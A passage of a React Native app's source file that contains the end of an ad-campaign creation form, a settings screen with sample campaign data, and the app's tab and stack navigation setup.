              <Text color={"#ccc"}>{typeAds || "Select here"}</Text>
            </TouchableOpacity>
          </View>
        </View>
        <View
          padding-10
          marginH-20
          borderRadius={12}
          backgroundColor={Colors.textWhite}
        >
          <Text text70BO marginB-10>
            Project Budget
          </Text>
          <TextInput
            style={stylesCompaign.input}
            placeholder="Project budget"
            placeholderTextColor={Colors.$textDisabled}
            value={projectBudget}
            onChangeText={setProjectBudget}
          />
        </View>
        <View
          padding-10
          marginH-20
          marginT-20
          borderRadius={12}
          backgroundColor={Colors.textWhite}
          row
          spread
        >
          <View>
            <Text text70BO marginB-10>
              Start date
            </Text>
            <RNDateTimePicker
              onChange={(e, d) => setStartDate(d)}
              style={{ marginLeft: 10 }}
              value={startDate}
            />
          </View>
          <View
            style={{
              height: "100%",
              backgroundColor: Colors.$outlineDisabled,
              width: 1,
            }}
          />
          <View>
            <Text text70BO marginB-10>
              End date
            </Text>
            <RNDateTimePicker
              onChange={(e, d) => setEndDate(d)}
              style={{ marginLeft: 10 }}
              value={endDate}
            />
          </View>
        </View>
        <View
          padding-10
          marginH-20
          marginT-20
          borderRadius={12}
          backgroundColor={Colors.textWhite}
        >
          <Text text70BO marginB-10>
            Campaign Description
          </Text>
          <TextInput
            multiline
            style={[stylesCompaign.input, { height: 100 }]}
            placeholder="Campaign Description"
            placeholderTextColor={Colors.$textDisabled}
            value={description}
            onChangeText={setDescription}
          />
        </View>
        <View padding-10 marginH-20 marginT-20 row spread>
          <TouchableOpacity
            style={{
              alignItems: "center",
              justifyContent: "center",
              width: 120,
              backgroundColor: Colors.$textDisabled,
              height: 50,
              borderRadius: 12,
              marginRight: 12,
            }}
            onPress={handleClear}
          >
            <Text color={Colors.textWhite} text80BO>
              Cancel
            </Text>
          </TouchableOpacity>
          <TouchableOpacity
            style={{
              alignItems: "center",
              justifyContent: "center",
              width: 180,
              backgroundColor: Colors.primaryColor,
              height: 50,
              borderRadius: 12,
            }}
            onPress={handleSave}
          >
            <Text color={Colors.textWhite} text80BO>
              Save
            </Text>
          </TouchableOpacity>
        </View>
      </ScrollView>
      <ModalPicker
        visible={modalVisible}
        onClose={() => setModalVisible(false)}
        showCancel={false}
        selectedValue={typeAds}
        onValueChange={(itemValue, itemIndex) => setTypeAds(itemValue)}
        items={pickerItems}
      />
    </SafeAreaView>
  );
};

const stylesCompaign = StyleSheet.create({
  container: {
    flex: 1,
    padding: 10,
    paddingHorizontal: 20,
  },
  header: {
    fontSize: 20,
    fontWeight: "bold",
  },
  input: {
    height: 40,
    borderColor: "#ccc",
    borderWidth: 1,
    borderRadius: 5,
    padding: 10,
  },
  row: {
    flexDirection: "row",
    justifyContent: "space-between",
    alignItems: "center",
    marginVertical: 10,
  },
  label: {
    fontSize: 16,
    fontWeight: "bold",
  },
  buttons: {
    flexDirection: "row",
    justifyContent: "space-between",
  },
  button: {
    fontSize: 16,
    fontWeight: "bold",
    color: "#fff",
    backgroundColor: "#000",
    padding: 10,
    borderRadius: 5,
  },
});

function SettingScreen({ navigation }) {
  const dataCampaign = [
    {
      campaign_name: "Black Friday Deals",
      spent: "$50000",
      clicks: 100000,
      conversion_rate: 0.02,
      views: 2500000,
      cpc: 0.25,
      createdAt: new Date().getTime(),
    },
    {
      campaign_name: "Cyber Monday Deals",
      spent: "$75000",
      clicks: 150000,
      conversion_rate: 0.03,
      views: 3750000,
      cpc: 0.5,
      createdAt: new Date().getTime() - 13312,
    },
    {
      campaign_name: "Back to School Deals",
      spent: "$100000",
      clicks: 200000,
      conversion_rate: 0.04,
      views: 5000000,
      cpc: 0.5,
      createdAt: new Date().getTime() - 61312,
    },
  ];

  function generateData() {
    console.log("Generating data...");

    dataCampaign.forEach((item) => {
      addDocument("campaigns", item);
    });
    console.log("Finish generate data...");
  }

  return (
    <SafeAreaView style={{ flex: 1 }}>
      <View
        row
        centerV
        spread
        paddingH-20
        paddingV-10
        backgroundColor={Colors.primaryColor}
      >
        <TouchableOpacity onPress={() => navigation.goBack()}>
          <ChevronLeftIcon width={30} height={30} color={Colors.textWhite} />
        </TouchableOpacity>
        <Text text60BO color={Colors.textWhite}>
          Settings
        </Text>
        <View />
      </View>
      <View
        row
        spread
        centerV
        backgroundColor={Colors.textWhite}
        margin-20
        padding-10
        height={50}
        borderRadius={12}
      >
        <Text text70 color={Colors.$iconDanger}>
          Currency Format
        </Text>
        <View row>
          <Text text70M marginR-10 color={Colors.$iconDanger}>
            USD
          </Text>
          <USDIcon color={Colors.$iconDanger} />
        </View>
      </View>
      {/* <View
        row
        spread
        centerV
        backgroundColor={Colors.textWhite}
        margin-20
        marginT-0
        padding-10
        height={50}
        borderRadius={12}
      >
        <Text text70 color={Colors.$iconSuccess}>
          Generate Data
        </Text>
        <View row>
          <TouchableOpacity onPress={generateData}>
            <PlusIcon color={Colors.$iconSuccess} />
          </TouchableOpacity>
        </View>
      </View> */}
      <View
        row
        spread
        centerV
        backgroundColor={Colors.textWhite}
        margin-20
        marginT-0
        padding-10
        height={50}
        borderRadius={12}
      >
        <Text text70 color={Colors.$outlineWarning}>
          Clear Data
        </Text>
        <View row>
          <TouchableOpacity>
            <TrashIcon color={Colors.$outlineWarning} />
          </TouchableOpacity>
        </View>
      </View>
      <View
        row
        spread
        centerV
        backgroundColor={Colors.textWhite}
        margin-20
        marginT-0
        padding-10
        height={50}
        borderRadius={12}
      >
        <Text text70 color={Colors.$textGeneral}>
          Version
        </Text>
        <View row>
          <Text text70M marginR-10 color={Colors.$textGeneral}>
            1.1.0
          </Text>
          <RooketIcon color={Colors.$textGeneral} />
        </View>
      </View>
    </SafeAreaView>
  );
}
function TabScreen() {
  return (
    <Tab.Navigator initialRouteName="HomeScreen">
      <Tab.Screen
        options={{
          gestureEnabled: false,
          headerShown: false,
          tabBarShowLabel: false,
          tabBarStyle: {
            position: "absolute",
            backgroundColor: Colors.primaryColor,
            borderRadius: 999,
            marginHorizontal: 20,
            height: 80,
            bottom: 15,
            paddingTop: 20,
          },
          tabBarIcon: ({ focused }) => (
            <View style={{ justifyContent: "center", alignItems: "center" }}>
              <MoneyIcon color={Colors.textWhite} width={30} height={30} />
              <Text
                style={{
                  color: Colors.textWhite,
                }}
              >
                Budget
              </Text>
            </View>
          ),
        }}
        name="HomeScreen"
        component={HomeScreen}
      />
      <Tab.Screen
        options={{
          gestureEnabled: false,
          headerShown: false,
          tabBarShowLabel: false,
          tabBarStyle: {
            position: "absolute",
            backgroundColor: Colors.primaryColor,
            borderRadius: 999,
            marginHorizontal: 20,
            height: 80,
            bottom: 15,
            paddingTop: 20,
          },
          tabBarIcon: ({ focused }) => (
            <View style={{ justifyContent: "center", alignItems: "center" }}>
              <PresentationChartBarIcon
                color={Colors.textWhite}
                width={30}
                height={30}
              />
              <Text
                style={{
                  color: Colors.textWhite,
                }}
              >
                Performance
              </Text>
            </View>
          ),
        }}
        name="PerformanceScreen"
        component={CampaignPerformanceForm}
      />
      <Tab.Screen
        options={{
          gestureEnabled: false,
          headerShown: false,
          tabBarShowLabel: false,
          tabBarStyle: {
            position: "absolute",
            backgroundColor: Colors.primaryColor,
            borderRadius: 999,
            marginHorizontal: 20,
            height: 80,
            bottom: 15,
            paddingTop: 20,
          },
          tabBarIcon: ({ focused }) => (
            <View style={{ justifyContent: "center", alignItems: "center" }}>
              <MegaphoneIcon color={Colors.textWhite} width={30} height={30} />
              <Text
                style={{
                  color: Colors.textWhite,
                }}
              >
                Create
              </Text>
            </View>
          ),
        }}
        name="CreateCampaign"
        component={CreateCampaign}
      />
    </Tab.Navigator>
  );
}

function App() {
  return (
    <NavigationContainer>
      <StatusBar barStyle="dark-content" />
      <Stack.Navigator
        initialRouteName="TabScreen"
        screenOptions={{ headerShown: false }}
      >
        <Stack.Screen
          options={{ headerShown: false }}
          name="TabScreen"
          component={TabScreen}
        />
        <Stack.Screen name="SettingScreen" component={SettingScreen} />
        {/* <Stack.Screen name="PushNotifyScreen" component={PushNotifyScreen} />
      <Stack.Screen name="SocialAuthScreen" component={SocialAuthScreen} />
      <Stack.Screen name="MainScreen" component={MainScreen} />
      <Stack.Screen name="LoadScreen" componentt={LoadScreen} /> */}
      </Stack.Navigator>
    </NavigationContainer>
  );
}
export default App;
